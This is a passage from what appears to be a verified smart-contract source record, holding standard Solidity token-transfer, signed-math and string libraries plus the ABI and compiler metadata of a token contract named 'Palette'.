{\\r\\n            if lt(selfbalance(), amount) {\\r\\n                mstore(0x00, 0xb12d13eb) // `ETHTransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            if iszero(\\r\\n                call(gasStipend, to, amount, codesize(), 0x00, codesize(), 0x00)\\r\\n            ) {\\r\\n                mstore(0x00, to) // Store the address in scratch space.\\r\\n                mstore8(0x0b, 0x73) // Opcode `PUSH20`.\\r\\n                mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.\\r\\n                if iszero(create(amount, 0x0b, 0x16)) {\\r\\n                    revert(codesize(), codesize())\\r\\n                } // For gas estimation.\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Force sends all the ETH in the current contract to `to`, with a `gasStipend`.\\r\\n    function forceSafeTransferAllETH(address to, uint256 gasStipend) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            if iszero(\\r\\n                call(\\r\\n                    gasStipend,\\r\\n                    to,\\r\\n                    selfbalance(),\\r\\n                    codesize(),\\r\\n                    0x00,\\r\\n                    codesize(),\\r\\n                    0x00\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, to) // Store the address in scratch space.\\r\\n                mstore8(0x0b, 0x73) // Opcode `PUSH20`.\\r\\n                mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.\\r\\n                if iszero(create(selfbalance(), 0x0b, 0x16)) {\\r\\n                    revert(codesize(), codesize())\\r\\n                } // For gas estimation.\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Force sends `amount` (in wei) ETH to `to`, with `GAS_STIPEND_NO_GRIEF`.\\r\\n    function forceSafeTransferETH(address to, uint256 amount) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            if lt(selfbalance(), amount) {\\r\\n                mstore(0x00, 0xb12d13eb) // `ETHTransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            if iszero(\\r\\n                call(\\r\\n                    GAS_STIPEND_NO_GRIEF,\\r\\n                    to,\\r\\n                    amount,\\r\\n                    codesize(),\\r\\n                    0x00,\\r\\n                    codesize(),\\r\\n                    0x00\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, to) // Store the address in scratch space.\\r\\n                mstore8(0x0b, 0x73) // Opcode `PUSH20`.\\r\\n                mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.\\r\\n                if iszero(create(amount, 0x0b, 0x16)) {\\r\\n                    revert(codesize(), codesize())\\r\\n                } // For gas estimation.\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Force sends all the ETH in the current contract to `to`, with `GAS_STIPEND_NO_GRIEF`.\\r\\n    function forceSafeTransferAllETH(address to) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            // forgefmt: disable-next-item\\r\\n            if iszero(\\r\\n                call(\\r\\n                    GAS_STIPEND_NO_GRIEF,\\r\\n                    to,\\r\\n                    selfbalance(),\\r\\n                    codesize(),\\r\\n                    0x00,\\r\\n                    codesize(),\\r\\n                    0x00\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, to) // Store the address in scratch space.\\r\\n                mstore8(0x0b, 0x73) // Opcode `PUSH20`.\\r\\n                mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.\\r\\n                if iszero(create(selfbalance(), 0x0b, 0x16)) {\\r\\n                    revert(codesize(), codesize())\\r\\n                } // For gas estimation.\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends `amount` (in wei) ETH to `to`, with a `gasStipend`.\\r\\n    function trySafeTransferETH(\\r\\n        address to,\\r\\n        uint256 amount,\\r\\n        uint256 gasStipend\\r\\n    ) internal returns (bool success) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            success := call(\\r\\n                gasStipend,\\r\\n                to,\\r\\n                amount,\\r\\n                codesize(),\\r\\n                0x00,\\r\\n                codesize(),\\r\\n                0x00\\r\\n            )\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends all the ETH in the current contract to `to`, with a `gasStipend`.\\r\\n    function trySafeTransferAllETH(\\r\\n        address to,\\r\\n        uint256 gasStipend\\r\\n    ) internal returns (bool success) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            success := call(\\r\\n                gasStipend,\\r\\n                to,\\r\\n                selfbalance(),\\r\\n                codesize(),\\r\\n                0x00,\\r\\n                codesize(),\\r\\n                0x00\\r\\n            )\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/\\r\\n    /*                      ERC20 OPERATIONS                      */\\r\\n    /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/\\r\\n\\r\\n    /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.\\r\\n    /// Reverts upon failure.\\r\\n    ///\\r\\n    /// The `from` account must have at least `amount` approved for\\r\\n    /// the current contract to manage.\\r\\n    function safeTransferFrom(\\r\\n        address token,\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let m := mload(0x40) // Cache the free memory pointer.\\r\\n            mstore(0x60, amount) // Store the `amount` argument.\\r\\n            mstore(0x40, to) // Store the `to` argument.\\r\\n            mstore(0x2c, shl(96, from)) // Store the `from` argument.\\r\\n            mstore(0x0c, 0x23b872dd000000000000000000000000) // `transferFrom(address,address,uint256)`.\\r\\n            // Perform the transfer, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x7939f424) // `TransferFromFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x60, 0) // Restore the zero slot to zero.\\r\\n            mstore(0x40, m) // Restore the free memory pointer.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends all of ERC20 `token` from `from` to `to`.\\r\\n    /// Reverts upon failure.\\r\\n    ///\\r\\n    /// The `from` account must have their entire balance approved for\\r\\n    /// the current contract to manage.\\r\\n    function safeTransferAllFrom(\\r\\n        address token,\\r\\n        address from,\\r\\n        address to\\r\\n    ) internal returns (uint256 amount) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let m := mload(0x40) // Cache the free memory pointer.\\r\\n            mstore(0x40, to) // Store the `to` argument.\\r\\n            mstore(0x2c, shl(96, from)) // Store the `from` argument.\\r\\n            mstore(0x0c, 0x70a08231000000000000000000000000) // `balanceOf(address)`.\\r\\n            // Read the balance, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    gt(returndatasize(), 0x1f), // At least 32 bytes returned.\\r\\n                    staticcall(gas(), token, 0x1c, 0x24, 0x60, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x7939f424) // `TransferFromFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x00, 0x23b872dd) // `transferFrom(address,address,uint256)`.\\r\\n            amount := mload(0x60) // The `amount` is already at 0x60. We\\u0027ll need to return it.\\r\\n            // Perform the transfer, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x7939f424) // `TransferFromFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x60, 0) // Restore the zero slot to zero.\\r\\n            mstore(0x40, m) // Restore the free memory pointer.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.\\r\\n    /// Reverts upon failure.\\r\\n    function safeTransfer(address token, address to, uint256 amount) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x14, to) // Store the `to` argument.\\r\\n            mstore(0x34, amount) // Store the `amount` argument.\\r\\n            mstore(0x00, 0xa9059cbb000000000000000000000000) // `transfer(address,uint256)`.\\r\\n            // Perform the transfer, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x34, 0) // Restore the part of the free memory pointer that was overwritten.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends all of ERC20 `token` from the current contract to `to`.\\r\\n    /// Reverts upon failure.\\r\\n    function safeTransferAll(\\r\\n        address token,\\r\\n        address to\\r\\n    ) internal returns (uint256 amount) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, 0x70a08231) // Store the function selector of `balanceOf(address)`.\\r\\n            mstore(0x20, address()) // Store the address of the current contract.\\r\\n            // Read the balance, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    gt(returndatasize(), 0x1f), // At least 32 bytes returned.\\r\\n                    staticcall(gas(), token, 0x1c, 0x24, 0x34, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x14, to) // Store the `to` argument.\\r\\n            amount := mload(0x34) // The `amount` is already at 0x34. We\\u0027ll need to return it.\\r\\n            mstore(0x00, 0xa9059cbb000000000000000000000000) // `transfer(address,uint256)`.\\r\\n            // Perform the transfer, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x34, 0) // Restore the part of the free memory pointer that was overwritten.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.\\r\\n    /// Reverts upon failure.\\r\\n    function safeApprove(address token, address to, uint256 amount) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x14, to) // Store the `to` argument.\\r\\n            mstore(0x34, amount) // Store the `amount` argument.\\r\\n            mstore(0x00, 0x095ea7b3000000000000000000000000) // `approve(address,uint256)`.\\r\\n            // Perform the approval, reverting upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0x3e3f8f73) // `ApproveFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n            mstore(0x34, 0) // Restore the part of the free memory pointer that was overwritten.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.\\r\\n    /// If the initial attempt to approve fails, attempts to reset the approved amount to zero,\\r\\n    /// then retries the approval again (some tokens, e.g. USDT, requires this).\\r\\n    /// Reverts upon failure.\\r\\n    function safeApproveWithRetry(\\r\\n        address token,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x14, to) // Store the `to` argument.\\r\\n            mstore(0x34, amount) // Store the `amount` argument.\\r\\n            mstore(0x00, 0x095ea7b3000000000000000000000000) // `approve(address,uint256)`.\\r\\n            // Perform the approval, retrying upon failure.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                    call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x34, 0) // Store 0 for the `amount`.\\r\\n                mstore(0x00, 0x095ea7b3000000000000000000000000) // `approve(address,uint256)`.\\r\\n                pop(call(gas(), token, 0, 0x10, 0x44, codesize(), 0x00)) // Reset the approval.\\r\\n                mstore(0x34, amount) // Store back the original `amount`.\\r\\n                // Retry the approval, reverting upon failure.\\r\\n                if iszero(\\r\\n                    and(\\r\\n                        or(eq(mload(0x00), 1), iszero(returndatasize())), // Returned 1 or nothing.\\r\\n                        call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)\\r\\n                    )\\r\\n                ) {\\r\\n                    mstore(0x00, 0x3e3f8f73) // `ApproveFailed()`.\\r\\n                    revert(0x1c, 0x04)\\r\\n                }\\r\\n            }\\r\\n            mstore(0x34, 0) // Restore the part of the free memory pointer that was overwritten.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the amount of ERC20 `token` owned by `account`.\\r\\n    /// Returns zero if the `token` does not exist.\\r\\n    function balanceOf(\\r\\n        address token,\\r\\n        address account\\r\\n    ) internal view returns (uint256 amount) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x14, account) // Store the `account` argument.\\r\\n            mstore(0x00, 0x70a08231000000000000000000000000) // `balanceOf(address)`.\\r\\n            amount := mul(\\r\\n                mload(0x20),\\r\\n                and(\\r\\n                    // The arguments of `and` are evaluated from right to left.\\r\\n                    gt(returndatasize(), 0x1f), // At least 32 bytes returned.\\r\\n                    staticcall(gas(), token, 0x10, 0x24, 0x20, 0x20)\\r\\n                )\\r\\n            )\\r\\n        }\\r\\n    }\\r\\n}\"},\"SignedMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/math/SignedMath.sol)\\r\\n\\r\\npragma solidity ^0.8.20;\\r\\n\\r\\n/**\\r\\n * @dev Standard signed math utilities missing in the Solidity language.\\r\\n */\\r\\nlibrary SignedMath {\\r\\n    /**\\r\\n     * @dev Returns the largest of two signed numbers.\\r\\n     */\\r\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\r\\n        return a \\u003e b ? a : b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the smallest of two signed numbers.\\r\\n     */\\r\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\r\\n        return a \\u003c b ? a : b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the average of two signed numbers without overflow.\\r\\n     * The result is rounded towards zero.\\r\\n     */\\r\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\r\\n        // Formula from the book \\\"Hacker\\u0027s Delight\\\"\\r\\n        int256 x = (a \\u0026 b) + ((a ^ b) \\u003e\\u003e 1);\\r\\n        return x + (int256(uint256(x) \\u003e\\u003e 255) \\u0026 (a ^ b));\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the absolute unsigned value of a signed value.\\r\\n     */\\r\\n    function abs(int256 n) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            // must be unchecked in order to support `n = type(int256).min`\\r\\n            return uint256(n \\u003e= 0 ? n : -n);\\r\\n        }\\r\\n    }\\r\\n}\"},\"Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Strings.sol)\\r\\n\\r\\npragma solidity ^0.8.20;\\r\\n\\r\\nimport {Math} from \\\"./Math.sol\\\";\\r\\nimport {SignedMath} from \\\"./SignedMath.sol\\\";\\r\\n\\r\\n/**\\r\\n * @dev String operations.\\r\\n */\\r\\nlibrary Strings {\\r\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\r\\n    uint8 private constant ADDRESS_LENGTH = 20;\\r\\n\\r\\n    /**\\r\\n     * @dev The `value` string doesn\\u0027t fit in the specified `length`.\\r\\n     */\\r\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\r\\n\\r\\n    /**\\r\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\r\\n     */\\r\\n    function toString(uint256 value) internal pure returns (string memory) {\\r\\n        unchecked {\\r\\n            uint256 length = Math.log10(value) + 1;\\r\\n            string memory buffer = new string(length);\\r\\n            uint256 ptr;\\r\\n            /// @solidity memory-safe-assembly\\r\\n            assembly {\\r\\n                ptr := add(buffer, add(32, length))\\r\\n            }\\r\\n            while (true) {\\r\\n                ptr--;\\r\\n                /// @solidity memory-safe-assembly\\r\\n                assembly {\\r\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\r\\n                }\\r\\n                value /= 10;\\r\\n                if (value == 0) break;\\r\\n            }\\r\\n            return buffer;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\r\\n     */\\r\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\r\\n        return string.concat(value \\u003c 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\r\\n     */\\r\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\r\\n        unchecked {\\r\\n            return toHexString(value, Math.log256(value) + 1);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\r\\n     */\\r\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\r\\n        uint256 localValue = value;\\r\\n        bytes memory buffer = new bytes(2 * length + 2);\\r\\n        buffer[0] = \\\"0\\\";\\r\\n        buffer[1] = \\\"x\\\";\\r\\n        for (uint256 i = 2 * length + 1; i \\u003e 1; --i) {\\r\\n            buffer[i] = HEX_DIGITS[localValue \\u0026 0xf];\\r\\n            localValue \\u003e\\u003e= 4;\\r\\n        }\\r\\n        if (localValue != 0) {\\r\\n            revert StringsInsufficientHexLength(value, length);\\r\\n        }\\r\\n        return string(buffer);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\r\\n     * representation.\\r\\n     */\\r\\n    function toHexString(address addr) internal pure returns (string memory) {\\r\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns true if the two strings are equal.\\r\\n     */\\r\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\r\\n        return bytes(a).length == bytes(b).length \\u0026\\u0026 keccak256(bytes(a)) == keccak256(bytes(b));\\r\\n    }\\r\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"removeFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"buyFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellFee\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Palette", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e171700e59a268af47a59c5afe523ef9867a8e03b9b79e0de52676ecd3535efd"}